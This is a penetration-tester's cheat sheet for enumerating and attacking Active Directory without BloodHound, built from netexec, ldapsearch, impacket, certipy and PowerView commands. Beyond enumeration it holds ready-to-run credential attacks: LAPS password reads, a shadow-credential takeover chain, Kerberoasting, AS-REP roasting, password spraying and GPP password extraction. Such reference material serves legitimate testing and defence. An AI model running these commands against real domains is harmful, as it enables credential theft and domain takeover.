# Manual AD Enumeration

## When BloodHound Is Unavailable

BloodHound can fail: SharpHound blocked by EDR, bloodhound-python has no route to DC, collection incomplete, or data is stale. This document lists the manual checks that replace each BloodHound function.

Every command here uses `netexec`, `ldapsearch`, `impacket`, or built-in Windows tools — no BloodHound required.

---

## 1. High-Value Groups

Find who is in the most privileged groups.

```bash
# Via netexec (fastest)
netexec ldap DC -u user -p pass -M group-mem --group "Domain Admins"
netexec ldap DC -u user -p pass -M group-mem --group "Enterprise Admins"
netexec ldap DC -u user -p pass -M group-mem --group "Administrators"
netexec ldap DC -u user -p pass -M group-mem --group "Schema Admins"
netexec ldap DC -u user -p pass -M group-mem --group "Server Operators"
netexec ldap DC -u user -p pass -M group-mem --group "Account Operators"
netexec ldap DC -u user -p pass -M group-mem --group "Backup Operators"
netexec ldap DC -u user -p pass -M group-mem --group "Print Operators"
netexec ldap DC -u user -p pass -M group-mem --group "DnsAdmins"
netexec ldap DC -u user -p pass -M group-mem --group "Hyper-V Administrators"
netexec ldap DC -u user -p pass -M group-mem --group "Exchange Windows Permissions"
netexec ldap DC -u user -p pass -M group-mem --group "Remote Desktop Users"
netexec ldap DC -u user -p pass -M group-mem --group "Remote Management Users"

# Via ldapsearch (works when netexec modules fail)
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(&(objectClass=group)(cn=Domain Admins))" member

# Windows (if you have a shell on a domain host)
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

**What to look for:** Users who are members of Domain Admins (game over if you can compromise them). Service accounts in privileged groups (Kerberoast targets).

---

## 2. Privileged Users (adminCount=1)

Users with `adminCount=1` have privileged access. These are Kerberoast and AS-REP roast candidates.

```bash
# All privileged users
netexec ldap DC -u user -p pass --users | grep admincount=1

# Via ldapsearch
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(&(objectClass=user)(adminCount=1))" sAMAccountName memberOf

# Find which privileged groups they're in
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(&(objectClass=user)(adminCount=1))" memberOf
```

**What to look for:** Users with `adminCount=1` who have weak SPNs (Kerberoast). Users with `adminCount=1` who lack Kerberos pre-auth (AS-REP roast).

---

## 3. ACL Opportunities (Manual)

Without BloodHound, finding ACL abuse paths requires LDAP queries. BloodHound is better at this, but these commands find the most common paths.

```bash
# Objects where your user has GenericAll
# Requires ldapsearch with specific ACL reading — this is complex manually.
# Alternative: Use PowerView on a Windows host
```

```powershell
# PowerView (on Windows host with admin or domain user)
Get-ObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
Find-InterestingDomainAcl -ResolveGUIDs

# Check if you can force change password on a privileged user
Get-ObjectAcl -Identity "TargetUser" | ? {$_.ActiveDirectoryRights -match "ForceChangePassword|ResetPassword"}
```

```bash
# Via netexec (limited but fast)
netexec ldap DC -u user -p pass -M oscp   # Basic ACL summary

# If you have a shell on a domain host, use dacledit.py
# Check if your user has write access to target's ACL
impacket-dacledit -action read -principal YOUR_USER -target TARGET_USER DOMAIN/user:pass
```

**What to look for:** `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AllExtendedRights` on privileged users or groups.

---

## 4. Delegation (Manual)

```bash
# Find all users/computers with unconstrained delegation
netexec ldap DC -u user -p pass --trusted-for-delegation

# Via ldapsearch
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn

# Find constrained delegation (which services can users delegate to)
impacket-findDelegation DOMAIN/user:pass

# Find RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
netexec ldap DC -u user -p pass -M rbcd

# Via ldapsearch (RBCD)
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" cn distinguishedName
```

**What to look for:** Computers with unconstrained delegation (TGT theft target). Users with constrained delegation that includes high-value SPNs (like CIFS/DC). Computers with RBCD set (potential lateral path).

---

## 5. ADCS (Manual)

```bash
# Find ADCS servers
netexec ldap DC -u user -p pass -M adcs

# Via ldapsearch
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "cn=Configuration,dc=domain,dc=local" \
  "(objectClass=pKIEnrollmentService)" cn dNSHostName

# Manual ESC checks (certipy is still the best tool here — it's not BloodHound)
certipy find -u user@DOMAIN -p pass -dc-ip DC
```

**What to look for:** The presence of ADCS at all. Certipy output showing ESC1 (low-priv user can enroll with SAN), ESC3 (Certificate Request Agent), or ESC8 (NTLM relay to ADCS).

---

## 6. LAPS (Manual)

```bash
# Check if LAPS is in use and who can read it
netexec ldap DC -u user -p pass -M laps

# Via ldapsearch (check if computers have ms-Mcs-AdmPwdExpirationTime)
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(ms-Mcs-AdmPwdExpirationTime=*)" cn ms-Mcs-AdmPwd

# Read LAPS passwords (requires ReadLAPSPassword permission)
netexec ldap DC -u user -p pass -M laps --laps

# LAPS v2 (Windows LAPS 2023+) — uses msLAPS-Password attribute
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(msLAPS-Password=*)" cn msLAPS-Password
# Decode: echo '<base64_value>' | base64 -d | jq .p   (JSON "p" field = password)
```

**What to look for:** Computers with `ms-Mcs-AdmPwdExpirationTime` set (LAPS v1 in use) or `msLAPS-Password` set (LAPS v2 in use). If you have ReadLAPSPassword, you get local admin passwords for specific hosts. Always check BOTH attributes.

---

## 7. Shadow Credential Opportunities (Manual)

```bash
# Check if any objects already have msDS-KeyCredentialLink populated
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "dc=domain,dc=local" \
  "(msDS-KeyCredentialLink=*)" cn distinguishedName

# If you have GenericAll/GenericWrite/WriteOwner on an object
# (determined via ACL checks in section 3), use certipy:
certipy shadow auto -u user@DOMAIN -p pass -dc-ip DC -account TARGET

# Target suggestions: domain controller computer accounts ($),
# privileged users (adminCount=1), service accounts
```

**What to look for:** Any object where you have GenericAll/GenericWrite/WriteOwner. The `certipy shadow auto` command handles the full chain: it checks if the target is eligible, adds the key credential, enrolls for a certificate, and authenticates.

---

## 8. Trusts (Manual)

```bash
# List all domain trusts
netexec ldap DC -u user -p pass -M trusts

# Via ldapsearch
ldapsearch -x -H ldap://DC -D "user@domain" -w pass -b "cn=System,dc=domain,dc=local" \
  "(objectClass=trustedDomain)" cn trustAttributes flatName

# Windows
nltest /domain_trusts
nltest /domain_trusts /all_trusts

# Enum through netexec (across trust)
netexec smb TARGET_DOMAIN -u user -p pass -d SOURCE_DOMAIN
```

**What to look for:** Trust direction (inbound, outbound, bidirectional). Trust type (external, forest, parent-child). If child→parent trust exists, you can forge an inter-realm TGT after compromising the child domain.

---

## Quick Reference: BH Independence Commands

```
GOAL                          COMMAND
────────────────────────────  ─────────────────────────────────────────
Find DA group members         netexec ldap DC -u u -p p -M group-mem --group "Domain Admins"
Find privileged users         netexec ldap DC -u u -p p --users | grep admincount=1
Find unconstrained delag      netexec ldap DC -u u -p p --trusted-for-delegation
Find constrained delegation   impacket-findDelegation DOM/u:p
Find RBCD                     netexec ldap DC -u u -p p -M rbcd
Find ADCS servers             netexec ldap DC -u u -p p -M adcs
Full ADCS analysis            certipy find -u u@DOM -p p -dc-ip DC
Find LAPS in use              netexec ldap DC -u u -p p -M laps
Read LAPS passwords           netexec ldap DC -u u -p p -M laps --laps
Find Kerberoastable users     GetUserSPNs -dc-ip DC DOM/u:p -request
Find AS-REP roastable users   GetNPUsers -dc-ip DC DOM/ -usersfile users.txt
List domain trusts            netexec ldap DC -u u -p p -M trusts
Check ACLs (PowerView)        Get-ObjectAcl -Identity "Domain Admins" | select *
Manual ACL check              impacket-dacledit -action read -principal USER -target TARGET DOM/u:p
Find computers                netexec smb <subnet>/24 -d DOMAIN
Password spray                netexec smb DC -u users.txt -p 'Pass123!'
Check for GPP                 netexec smb DC -u u -p p -M gpp_password
```
